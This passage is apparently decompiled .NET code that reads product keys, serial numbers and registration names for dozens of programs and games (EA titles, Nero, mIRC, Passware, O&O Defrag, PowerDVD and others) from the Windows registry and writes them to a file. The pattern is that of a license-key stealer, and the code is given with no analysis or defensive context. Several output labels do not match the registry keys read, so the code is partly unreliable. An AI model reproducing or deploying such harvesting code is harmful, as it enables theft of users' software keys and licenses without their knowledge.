					num3 = -102;
					goto IL_29f4;
					IL_29f4:
					num = 593;
					text100 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\JSG\\Matrix Saver V2", "Registration", null));
					goto IL_2a12;
					IL_2a12:
					num = 594;
					streamWriter.WriteLine("Matrix Screensave : " + text100);
					goto IL_2a2c;
					IL_2a2c:
					num = 595;
					streamWriter.Flush();
					goto IL_2a3a;
					IL_2a3a:
					num = 596;
					streamWriter.WriteLine(string.Empty);
					goto IL_2a4d;
					IL_2a4d:
					num = 597;
					streamWriter.Flush();
					goto IL_2a5b;
					IL_2a5b:
					ProjectData.ClearProjectError();
					num3 = -103;
					goto IL_2a64;
					IL_2a64:
					num = 599;
					text101 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault", "ergc", null));
					goto IL_2a82;
					IL_2a82:
					num = 600;
					streamWriter.WriteLine("Medal of Honor: Airborne : " + text101);
					goto IL_2a9c;
					IL_2a9c:
					num = 601;
					streamWriter.Flush();
					goto IL_2aaa;
					IL_2aaa:
					num = 602;
					streamWriter.WriteLine(string.Empty);
					goto IL_2abd;
					IL_2abd:
					num = 603;
					streamWriter.Flush();
					goto IL_2acb;
					IL_2acb:
					ProjectData.ClearProjectError();
					num3 = -104;
					goto IL_2ad4;
					IL_2ad4:
					num = 605;
					text102 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough", "ergc", null));
					goto IL_2af2;
					IL_2af2:
					num = 606;
					streamWriter.WriteLine("Medal of Honor: Allied Assault : " + text102);
					goto IL_2b0c;
					IL_2b0c:
					num = 607;
					streamWriter.Flush();
					goto IL_2b1a;
					IL_2b1a:
					num = 608;
					streamWriter.WriteLine(string.Empty);
					goto IL_2b2d;
					IL_2b2d:
					num = 609;
					streamWriter.Flush();
					goto IL_2b3b;
					IL_2b3b:
					ProjectData.ClearProjectError();
					num3 = -105;
					goto IL_2b44;
					IL_2b44:
					num = 611;
					text103 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Spearhead", "ergc", null));
					goto IL_2b62;
					IL_2b62:
					num = 612;
					streamWriter.WriteLine("Medal of Honor: Allied Assault: Breakthrough : " + text103);
					goto IL_2b7c;
					IL_2b7c:
					num = 613;
					streamWriter.Flush();
					goto IL_2b8a;
					IL_2b8a:
					num = 614;
					streamWriter.WriteLine(string.Empty);
					goto IL_2b9d;
					IL_2b9d:
					num = 615;
					streamWriter.Flush();
					goto IL_2bab;
					IL_2bab:
					ProjectData.ClearProjectError();
					num3 = -106;
					goto IL_2bb4;
					IL_2bb4:
					num = 617;
					text104 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\mIRC", "UserName", null));
					goto IL_2bd2;
					IL_2bd2:
					num = 618;
					streamWriter.WriteLine("Medal of Honor: Heroes 2 : " + text104);
					goto IL_2bec;
					IL_2bec:
					num = 619;
					streamWriter.Flush();
					goto IL_2bfa;
					IL_2bfa:
					num = 620;
					streamWriter.WriteLine(string.Empty);
					goto IL_2c0d;
					IL_2c0d:
					num = 621;
					streamWriter.Flush();
					goto IL_2c1b;
					IL_2c1b:
					ProjectData.ClearProjectError();
					num3 = -107;
					goto IL_2c24;
					IL_2c24:
					num = 623;
					text105 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\mIRC", "License", null));
					goto IL_2c42;
					IL_2c42:
					num = 624;
					streamWriter.WriteLine("mIRC : " + text105);
					goto IL_2c5c;
					IL_2c5c:
					num = 625;
					streamWriter.Flush();
					goto IL_2c6a;
					IL_2c6a:
					num = 626;
					streamWriter.WriteLine(string.Empty);
					goto IL_2c7d;
					IL_2c7d:
					num = 627;
					streamWriter.Flush();
					goto IL_2c8b;
					IL_2c8b:
					ProjectData.ClearProjectError();
					num3 = -108;
					goto IL_2c94;
					IL_2c94:
					num = 629;
					text106 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2002", "ergc", null));
					goto IL_2cb2;
					IL_2cb2:
					num = 630;
					streamWriter.WriteLine("Nascar Racing 2002 : " + text106);
					goto IL_2ccc;
					IL_2ccc:
					num = 631;
					streamWriter.Flush();
					goto IL_2cda;
					IL_2cda:
					num = 632;
					streamWriter.WriteLine(string.Empty);
					goto IL_2ced;
					IL_2ced:
					num = 633;
					streamWriter.Flush();
					goto IL_2cfb;
					IL_2cfb:
					ProjectData.ClearProjectError();
					num3 = -109;
					goto IL_2d04;
					IL_2d04:
					num = 635;
					text107 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2003", "ergc", null));
					goto IL_2d22;
					IL_2d22:
					num = 636;
					streamWriter.WriteLine("Nascar Racing 2003 : " + text107);
					goto IL_2d3c;
					IL_2d3c:
					num = 637;
					streamWriter.Flush();
					goto IL_2d4a;
					IL_2d4a:
					num = 638;
					streamWriter.WriteLine(string.Empty);
					goto IL_2d5d;
					IL_2d5d:
					num = 639;
					streamWriter.Flush();
					goto IL_2d6b;
					IL_2d6b:
					ProjectData.ClearProjectError();
					num3 = -110;
					goto IL_2d74;
					IL_2d74:
					num = 641;
					text108 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2002", "ergc", null));
					goto IL_2d92;
					IL_2d92:
					num = 642;
					streamWriter.WriteLine("NHL 2002 : " + text108);
					goto IL_2dac;
					IL_2dac:
					num = 643;
					streamWriter.Flush();
					goto IL_2dba;
					IL_2dba:
					num = 644;
					streamWriter.WriteLine(string.Empty);
					goto IL_2dcd;
					IL_2dcd:
					num = 645;
					streamWriter.Flush();
					goto IL_2ddb;
					IL_2ddb:
					ProjectData.ClearProjectError();
					num3 = -111;
					goto IL_2de4;
					IL_2de4:
					num = 647;
					text109 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 2003", "ergc", null));
					goto IL_2e02;
					IL_2e02:
					num = 648;
					streamWriter.WriteLine("NBA LIVE 2003 : " + text109);
					goto IL_2e1c;
					IL_2e1c:
					num = 649;
					streamWriter.Flush();
					goto IL_2e2a;
					IL_2e2a:
					num = 650;
					streamWriter.WriteLine(string.Empty);
					goto IL_2e3d;
					IL_2e3d:
					num = 651;
					streamWriter.Flush();
					goto IL_2e4b;
					IL_2e4b:
					ProjectData.ClearProjectError();
					num3 = -112;
					goto IL_2e54;
					IL_2e54:
					num = 653;
					text110 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 2004", "ergc", null));
					goto IL_2e72;
					IL_2e72:
					num = 654;
					streamWriter.WriteLine("NBA LIVE 2004 : " + text110);
					goto IL_2e8c;
					IL_2e8c:
					num = 655;
					streamWriter.Flush();
					goto IL_2e9a;
					IL_2e9a:
					num = 656;
					streamWriter.WriteLine(string.Empty);
					goto IL_2ead;
					IL_2ead:
					num = 657;
					streamWriter.Flush();
					goto IL_2ebb;
					IL_2ebb:
					ProjectData.ClearProjectError();
					num3 = -113;
					goto IL_2ec4;
					IL_2ec4:
					num = 659;
					text111 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 07", "ergc", null));
					goto IL_2ee2;
					IL_2ee2:
					num = 660;
					streamWriter.WriteLine("NBA LIVE 07 : " + text111);
					goto IL_2efc;
					IL_2efc:
					num = 661;
					streamWriter.Flush();
					goto IL_2f0a;
					IL_2f0a:
					num = 662;
					streamWriter.WriteLine(string.Empty);
					goto IL_2f1d;
					IL_2f1d:
					num = 663;
					streamWriter.Flush();
					goto IL_2f2b;
					IL_2f2b:
					ProjectData.ClearProjectError();
					num3 = -114;
					goto IL_2f34;
					IL_2f34:
					num = 665;
					text112 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA Live 08", "ergc", null));
					goto IL_2f52;
					IL_2f52:
					num = 666;
					streamWriter.WriteLine("NBA Live 08 : " + text112);
					goto IL_2f6c;
					IL_2f6c:
					num = 667;
					streamWriter.Flush();
					goto IL_2f7a;
					IL_2f7a:
					num = 668;
					streamWriter.WriteLine(string.Empty);
					goto IL_2f8d;
					IL_2f8d:
					num = 669;
					streamWriter.Flush();
					goto IL_2f9b;
					IL_2f9b:
					ProjectData.ClearProjectError();
					num3 = -115;
					goto IL_2fa4;
					IL_2fa4:
					num = 671;
					text113 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Need for Speed Carbon", "ergc", null));
					goto IL_2fc2;
					IL_2fc2:
					num = 672;
					streamWriter.WriteLine("Need for Speed Carbon : " + text113);
					goto IL_2fdc;
					IL_2fdc:
					num = 673;
					streamWriter.Flush();
					goto IL_2fea;
					IL_2fea:
					num = 674;
					streamWriter.WriteLine(string.Empty);
					goto IL_2ffd;
					IL_2ffd:
					num = 675;
					streamWriter.Flush();
					goto IL_300b;
					IL_300b:
					ProjectData.ClearProjectError();
					num3 = -116;
					goto IL_3014;
					IL_3014:
					num = 677;
					text114 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2", "ergc", null));
					goto IL_3032;
					IL_3032:
					num = 678;
					streamWriter.WriteLine("Need For Speed Hot Pursuit 2 : " + text114);
					goto IL_304c;
					IL_304c:
					num = 679;
					streamWriter.Flush();
					goto IL_305a;
					IL_305a:
					num = 680;
					streamWriter.WriteLine(string.Empty);
					goto IL_306d;
					IL_306d:
					num = 681;
					streamWriter.Flush();
					goto IL_307b;
					IL_307b:
					ProjectData.ClearProjectError();
					num3 = -117;
					goto IL_3084;
					IL_3084:
					num = 683;
					text115 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need for Speed Most Wanted", "ergc", null));
					goto IL_30a2;
					IL_30a2:
					num = 684;
					streamWriter.WriteLine("Need for Speed Most Wanted : " + text115);
					goto IL_30bc;
					IL_30bc:
					num = 685;
					streamWriter.Flush();
					goto IL_30ca;
					IL_30ca:
					num = 686;
					streamWriter.WriteLine(string.Empty);
					goto IL_30dd;
					IL_30dd:
					num = 687;
					streamWriter.Flush();
					goto IL_30eb;
					IL_30eb:
					ProjectData.ClearProjectError();
					num3 = -118;
					goto IL_30f4;
					IL_30f4:
					num = 689;
					text116 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Need for Speed ProStreet", "ergc", null));
					goto IL_3112;
					IL_3112:
					num = 690;
					streamWriter.WriteLine("Need for Speed ProStreet : " + text116);
					goto IL_312c;
					IL_312c:
					num = 691;
					streamWriter.Flush();
					goto IL_313a;
					IL_313a:
					num = 692;
					streamWriter.WriteLine(string.Empty);
					goto IL_314d;
					IL_314d:
					num = 693;
					streamWriter.Flush();
					goto IL_315b;
					IL_315b:
					ProjectData.ClearProjectError();
					num3 = -119;
					goto IL_3164;
					IL_3164:
					num = 695;
					text117 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Underground", "ergc", null));
					goto IL_3182;
					IL_3182:
					num = 696;
					streamWriter.WriteLine("Need For Speed Underground : " + text117);
					goto IL_319c;
					IL_319c:
					num = 697;
					streamWriter.Flush();
					goto IL_31aa;
					IL_31aa:
					num = 698;
					streamWriter.WriteLine(string.Empty);
					goto IL_31bd;
					IL_31bd:
					num = 699;
					streamWriter.Flush();
					goto IL_31cb;
					IL_31cb:
					ProjectData.ClearProjectError();
					num3 = -120;
					goto IL_31d4;
					IL_31d4:
					num = 701;
					text118 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Need for Speed Underground 2", "ergc", null));
					goto IL_31f2;
					IL_31f2:
					num = 702;
					streamWriter.WriteLine("Need For Speed Underground 2 : " + text118);
					goto IL_320c;
					IL_320c:
					num = 703;
					streamWriter.Flush();
					goto IL_321a;
					IL_321a:
					num = 704;
					streamWriter.WriteLine(string.Empty);
					goto IL_322d;
					IL_322d:
					num = 705;
					streamWriter.Flush();
					goto IL_323b;
					IL_323b:
					ProjectData.ClearProjectError();
					num3 = -121;
					goto IL_3244;
					IL_3244:
					num = 707;
					text119 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\Nero - Burning Rom\\Info", "Serial6", null));
					goto IL_3262;
					IL_3262:
					num = 708;
					streamWriter.WriteLine("Nero - Burning Rom : " + text119);
					goto IL_327c;
					IL_327c:
					num = 709;
					streamWriter.Flush();
					goto IL_328a;
					IL_328a:
					num = 710;
					streamWriter.WriteLine(string.Empty);
					goto IL_329d;
					IL_329d:
					num = 711;
					streamWriter.Flush();
					goto IL_32ab;
					IL_32ab:
					ProjectData.ClearProjectError();
					num3 = -122;
					goto IL_32b4;
					IL_32b4:
					num = 713;
					text120 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Nero\\Installation\\Families\\Nero 7\\Info", "Serial7_1191197813", null));
					goto IL_32d2;
					IL_32d2:
					num = 714;
					streamWriter.WriteLine("Nero 7 : " + text120);
					goto IL_32ec;
					IL_32ec:
					num = 715;
					streamWriter.Flush();
					goto IL_32fa;
					IL_32fa:
					num = 716;
					streamWriter.WriteLine(string.Empty);
					goto IL_330d;
					IL_330d:
					num = 717;
					streamWriter.Flush();
					goto IL_331b;
					IL_331b:
					ProjectData.ClearProjectError();
					num3 = -123;
					goto IL_3324;
					IL_3324:
					num = 719;
					text121 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Nero\\Installation\\Families\\Nero 8\\Info", "Serial8_1194709660", null));
					goto IL_3342;
					IL_3342:
					num = 720;
					streamWriter.WriteLine("Nero 8 : " + text121);
					goto IL_335c;
					IL_335c:
					num = 721;
					streamWriter.Flush();
					goto IL_336a;
					IL_336a:
					num = 722;
					streamWriter.WriteLine(string.Empty);
					goto IL_337d;
					IL_337d:
					num = 723;
					streamWriter.Flush();
					goto IL_338b;
					IL_338b:
					ProjectData.ClearProjectError();
					num3 = -124;
					goto IL_3394;
					IL_3394:
					num = 725;
					text122 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2002", "ergc", null));
					goto IL_33b2;
					IL_33b2:
					num = 726;
					streamWriter.WriteLine("NHL 2002 : " + text122);
					goto IL_33cc;
					IL_33cc:
					num = 727;
					streamWriter.Flush();
					goto IL_33da;
					IL_33da:
					num = 728;
					streamWriter.WriteLine(string.Empty);
					goto IL_33ed;
					IL_33ed:
					num = 729;
					streamWriter.Flush();
					goto IL_33fb;
					IL_33fb:
					ProjectData.ClearProjectError();
					num3 = -125;
					goto IL_3404;
					IL_3404:
					num = 731;
					text123 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2003", "ergc", null));
					goto IL_3422;
					IL_3422:
					num = 732;
					streamWriter.WriteLine("NHL 2003 : " + text123);
					goto IL_343c;
					IL_343c:
					num = 733;
					streamWriter.Flush();
					goto IL_344a;
					IL_344a:
					num = 734;
					streamWriter.WriteLine(string.Empty);
					goto IL_345d;
					IL_345d:
					num = 735;
					streamWriter.Flush();
					goto IL_346b;
					IL_346b:
					ProjectData.ClearProjectError();
					num3 = -126;
					goto IL_3474;
					IL_3474:
					num = 737;
					text124 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2004", "ergc", null));
					goto IL_3492;
					IL_3492:
					num = 738;
					streamWriter.WriteLine("NHL 2004 : " + text124);
					goto IL_34ac;
					IL_34ac:
					num = 739;
					streamWriter.Flush();
					goto IL_34ba;
					IL_34ba:
					num = 740;
					streamWriter.WriteLine(string.Empty);
					goto IL_34cd;
					IL_34cd:
					num = 741;
					streamWriter.Flush();
					goto IL_34db;
					IL_34db:
					ProjectData.ClearProjectError();
					num3 = -127;
					goto IL_34e4;
					IL_34e4:
					num = 743;
					text125 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2005", "ergc", null));
					goto IL_3502;
					IL_3502:
					num = 744;
					streamWriter.WriteLine("NHL 2005 : " + text125);
					goto IL_351c;
					IL_351c:
					num = 745;
					streamWriter.Flush();
					goto IL_352a;
					IL_352a:
					num = 746;
					streamWriter.WriteLine(string.Empty);
					goto IL_353d;
					IL_353d:
					num = 747;
					streamWriter.Flush();
					goto IL_354b;
					IL_354b:
					ProjectData.ClearProjectError();
					num3 = -128;
					goto IL_3554;
					IL_3554:
					num = 749;
					text126 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Westwood\\Nox", "Serial", null));
					goto IL_3572;
					IL_3572:
					num = 750;
					streamWriter.WriteLine("NOX : " + text126);
					goto IL_358c;
					IL_358c:
					num = 751;
					streamWriter.Flush();
					goto IL_359a;
					IL_359a:
					num = 752;
					streamWriter.WriteLine(string.Empty);
					goto IL_35ad;
					IL_35ad:
					num = 753;
					streamWriter.Flush();
					goto IL_35bb;
					IL_35bb:
					ProjectData.ClearProjectError();
					num3 = -129;
					goto IL_35c7;
					IL_35c7:
					num = 755;
					text127 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\NuMega\\SmartCheck", "Serial", null));
					goto IL_35e5;
					IL_35e5:
					num = 756;
					streamWriter.WriteLine("Numega SmartCheck : " + text127);
					goto IL_35ff;
					IL_35ff:
					num = 757;
					streamWriter.Flush();
					goto IL_360d;
					IL_360d:
					num = 758;
					streamWriter.WriteLine(string.Empty);
					goto IL_3620;
					IL_3620:
					num = 759;
					streamWriter.Flush();
					goto IL_362e;
					IL_362e:
					ProjectData.ClearProjectError();
					num3 = -130;
					goto IL_363a;
					IL_363a:
					num = 761;
					text128 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\OnlineTVPlayer\\RegInfo", "name", null));
					goto IL_3658;
					IL_3658:
					num = 762;
					streamWriter.WriteLine("OnlineTVPlayer (Name) : " + text128);
					goto IL_3672;
					IL_3672:
					num = 763;
					streamWriter.Flush();
					goto IL_3680;
					IL_3680:
					num = 764;
					streamWriter.WriteLine(string.Empty);
					goto IL_3693;
					IL_3693:
					num = 765;
					streamWriter.Flush();
					goto IL_36a1;
					IL_36a1:
					ProjectData.ClearProjectError();
					num3 = -131;
					goto IL_36ad;
					IL_36ad:
					num = 767;
					text129 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\OnlineTVPlayer\\RegInfo", "serial", null));
					goto IL_36cb;
					IL_36cb:
					num = 768;
					streamWriter.WriteLine("OnlineTVPlayer (Serial) : " + text129);
					goto IL_36e5;
					IL_36e5:
					num = 769;
					streamWriter.Flush();
					goto IL_36f3;
					IL_36f3:
					num = 770;
					streamWriter.WriteLine(string.Empty);
					goto IL_3706;
					IL_3706:
					num = 771;
					streamWriter.Flush();
					goto IL_3714;
					IL_3714:
					ProjectData.ClearProjectError();
					num3 = -132;
					goto IL_3720;
					IL_3720:
					num = 773;
					text130 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\O&O\\O&O Defrag\\8.0\\Pro\\licenses", "User", null));
					goto IL_373e;
					IL_373e:
					num = 774;
					streamWriter.WriteLine("O&O Defrag 8.0 (Username) : " + text130);
					goto IL_3758;
					IL_3758:
					num = 775;
					streamWriter.Flush();
					goto IL_3766;
					IL_3766:
					num = 776;
					streamWriter.WriteLine(string.Empty);
					goto IL_3779;
					IL_3779:
					num = 777;
					streamWriter.Flush();
					goto IL_3787;
					IL_3787:
					ProjectData.ClearProjectError();
					num3 = -133;
					goto IL_3793;
					IL_3793:
					num = 779;
					text131 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\O&O\\O&O Defrag\\8.0\\Pro\\licenses", "Company", null));
					goto IL_37b1;
					IL_37b1:
					num = 780;
					streamWriter.WriteLine("O&O Defrag 8.0 (Company) : " + text131);
					goto IL_37cb;
					IL_37cb:
					num = 781;
					streamWriter.Flush();
					goto IL_37d9;
					IL_37d9:
					num = 782;
					streamWriter.WriteLine(string.Empty);
					goto IL_37ec;
					IL_37ec:
					num = 783;
					streamWriter.Flush();
					goto IL_37fa;
					IL_37fa:
					ProjectData.ClearProjectError();
					num3 = -134;
					goto IL_3806;
					IL_3806:
					num = 785;
					text132 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\O&O\\O&O Defrag\\8.0\\Pro\\licenses", "SerialNo", null));
					goto IL_3824;
					IL_3824:
					num = 786;
					streamWriter.WriteLine("O&O Defrag 8.0 (Serial) : " + text132);
					goto IL_383e;
					IL_383e:
					num = 787;
					streamWriter.Flush();
					goto IL_384c;
					IL_384c:
					num = 788;
					streamWriter.WriteLine(string.Empty);
					goto IL_385f;
					IL_385f:
					num = 789;
					streamWriter.Flush();
					goto IL_386d;
					IL_386d:
					ProjectData.ClearProjectError();
					num3 = -135;
					goto IL_3879;
					IL_3879:
					num = 791;
					text133 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\PowerQuest\\PartitionMagic\\8.0\\UserInfo", "SerialNumber", null));
					goto IL_3897;
					IL_3897:
					num = 792;
					streamWriter.WriteLine("Partition Magic 8.0 : " + text133);
					goto IL_38b1;
					IL_38b1:
					num = 793;
					streamWriter.Flush();
					goto IL_38bf;
					IL_38bf:
					num = 794;
					streamWriter.WriteLine(string.Empty);
					goto IL_38d2;
					IL_38d2:
					num = 795;
					streamWriter.Flush();
					goto IL_38e0;
					IL_38e0:
					ProjectData.ClearProjectError();
					num3 = -136;
					goto IL_38ec;
					IL_38ec:
					num = 797;
					text134 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Encryption Analyzer\\1\\Registration,License", "Name", null));
					goto IL_390a;
					IL_390a:
					num = 798;
					streamWriter.WriteLine("Passware Encryption Analyzer (Name) : " + text134);
					goto IL_3924;
					IL_3924:
					num = 799;
					streamWriter.Flush();
					goto IL_3932;
					IL_3932:
					num = 800;
					streamWriter.WriteLine(string.Empty);
					goto IL_3945;
					IL_3945:
					num = 801;
					streamWriter.Flush();
					goto IL_3953;
					IL_3953:
					ProjectData.ClearProjectError();
					num3 = -137;
					goto IL_395f;
					IL_395f:
					num = 803;
					text135 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Encryption Analyzer\\1\\Registration,License", "SerialNumber", null));
					goto IL_397d;
					IL_397d:
					num = 804;
					streamWriter.WriteLine("Passware Encryption Analyzer (License) : " + text135);
					goto IL_3997;
					IL_3997:
					num = 805;
					streamWriter.Flush();
					goto IL_39a5;
					IL_39a5:
					num = 806;
					streamWriter.WriteLine(string.Empty);
					goto IL_39b8;
					IL_39b8:
					num = 807;
					streamWriter.Flush();
					goto IL_39c6;
					IL_39c6:
					ProjectData.ClearProjectError();
					num3 = -138;
					goto IL_39d2;
					IL_39d2:
					num = 809;
					text136 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Encryption Analyzer\\1\\Registration,License", "Serial", null));
					goto IL_39f0;
					IL_39f0:
					num = 810;
					streamWriter.WriteLine("Passware Encryption Analyzer (Serial) : " + text136);
					goto IL_3a0a;
					IL_3a0a:
					num = 811;
					streamWriter.Flush();
					goto IL_3a18;
					IL_3a18:
					num = 812;
					streamWriter.WriteLine(string.Empty);
					goto IL_3a2b;
					IL_3a2b:
					num = 813;
					streamWriter.Flush();
					goto IL_3a39;
					IL_3a39:
					ProjectData.ClearProjectError();
					num3 = -139;
					goto IL_3a45;
					IL_3a45:
					num = 815;
					text137 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Windows Key\\7\\Registration", "License", null));
					goto IL_3a63;
					IL_3a63:
					num = 816;
					streamWriter.WriteLine("Passware Windows Key (License) : " + text137);
					goto IL_3a7d;
					IL_3a7d:
					num = 817;
					streamWriter.Flush();
					goto IL_3a8b;
					IL_3a8b:
					num = 818;
					streamWriter.WriteLine(string.Empty);
					goto IL_3a9e;
					IL_3a9e:
					num = 819;
					streamWriter.Flush();
					goto IL_3aac;
					IL_3aac:
					ProjectData.ClearProjectError();
					num3 = -140;
					goto IL_3ab8;
					IL_3ab8:
					num = 821;
					text138 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Windows Key\\7\\Registration", "Name", null));
					goto IL_3ad6;
					IL_3ad6:
					num = 822;
					streamWriter.WriteLine("Passware Windows Key (Name) : " + text138);
					goto IL_3af0;
					IL_3af0:
					num = 823;
					streamWriter.Flush();
					goto IL_3afe;
					IL_3afe:
					num = 824;
					streamWriter.WriteLine(string.Empty);
					goto IL_3b11;
					IL_3b11:
					num = 825;
					streamWriter.Flush();
					goto IL_3b1f;
					IL_3b1f:
					ProjectData.ClearProjectError();
					num3 = -141;
					goto IL_3b2b;
					IL_3b2b:
					num = 827;
					text139 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Windows Key\\7\\Registration", "Serial", null));
					goto IL_3b49;
					IL_3b49:
					num = 828;
					streamWriter.WriteLine("Passware Windows Key (Serial) : " + text139);
					goto IL_3b63;
					IL_3b63:
					num = 829;
					streamWriter.Flush();
					goto IL_3b71;
					IL_3b71:
					num = 830;
					streamWriter.WriteLine(string.Empty);
					goto IL_3b84;
					IL_3b84:
					num = 831;
					streamWriter.Flush();
					goto IL_3b92;
					IL_3b92:
					ProjectData.ClearProjectError();
					num3 = -142;
					goto IL_3b9e;
					IL_3b9e:
					num = 833;
					text140 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\CyberLink\\PowerDVD", "UI_RMK", null));
					goto IL_3bbc;
					IL_3bbc:
					num = 834;
					streamWriter.WriteLine("PowerDvD : " + text140);
					goto IL_3bd6;
					IL_3bd6:
					num = 835;
					streamWriter.Flush();
					goto IL_3be4;
					IL_3be4:
					num = 836;
					streamWriter.WriteLine(string.Empty);
					goto IL_3bf7;
					IL_3bf7:
					num = 837;
					streamWriter.Flush();
					goto IL_3c05;
					IL_3c05:
					ProjectData.ClearProjectError();
					num3 = -143;
					goto IL_3c11;
					IL_3c11:
					num = 839;
					text141 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\EnTech\\PowerStrip", "Key", null));
					goto IL_3c2f;
					IL_3c2f:
					num = 840;
					streamWriter.WriteLine("PowerStrip : " + text141);
					goto IL_3c49;
					IL_3c49:
					num = 841;
					streamWriter.Flush();
					goto IL_3c57;
					IL_3c57:
					num = 842;
					streamWriter.WriteLine(string.Empty);
					goto IL_3c6a;
					IL_3c6a:
					num = 843;
					streamWriter.Flush();
					goto IL_3c78;
					IL_3c78:
					ProjectData.ClearProjectError();
					num3 = -144;
					goto IL_3c84;
					IL_3c84:
					num = 845;
					text142 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\KONAMI\\PES2008", "code", null));
					goto IL_3ca2;
					IL_3ca2:
					num = 846;
					streamWriter.WriteLine("Pro Evolution Soccer 2008 : " + text142);
					goto IL_3cbc;
					IL_3cbc:
					num = 847;
					streamWriter.Flush();
					goto IL_3cca;
					IL_3cca:
					num = 848;
					streamWriter.WriteLine(string.Empty);
					goto IL_3cdd;
					IL_3cdd:
					num = 849;
					streamWriter.Flush();
					goto IL_3ceb;
					IL_3ceb:
					ProjectData.ClearProjectError();
					num3 = -145;
					goto IL_3cf7;
					IL_3cf7:
					num = 851;
					text143 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Red Storm Entertainment\\RAVENSHIELD", "CDKey", null));
					goto IL_3d15;
					IL_3d15:
					num = 852;
					streamWriter.WriteLine("Rainbow Six III RavenShield : " + text143);
					goto IL_3d2f;
					IL_3d2f:
					num = 853;
					streamWriter.Flush();
					goto IL_3d3d;
					IL_3d3d:
					num = 854;
					streamWriter.WriteLine(string.Empty);
					goto IL_3d50;
					IL_3d50:
					num = 855;
					streamWriter.Flush();
					goto IL_3d5e;
					IL_3d5e:
					ProjectData.ClearProjectError();
					num3 = -146;
					goto IL_3d6a;
					IL_3d6a:
					num = 857;
					text144 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Shogun Total War - Warlord Edition", "ergc", null));
					goto IL_3d88;
					IL_3d88:
					num = 858;
					streamWriter.WriteLine("Shogun Total War Warlord Edition : " + text144);
					goto IL_3da2;
					IL_3da2:
					num = 859;
					streamWriter.Flush();
					goto IL_3db0;
					IL_3db0:
					num = 860;
					streamWriter.WriteLine(string.Empty);
					goto IL_3dc3;
					IL_3dc3:
					num = 861;
					streamWriter.Flush();
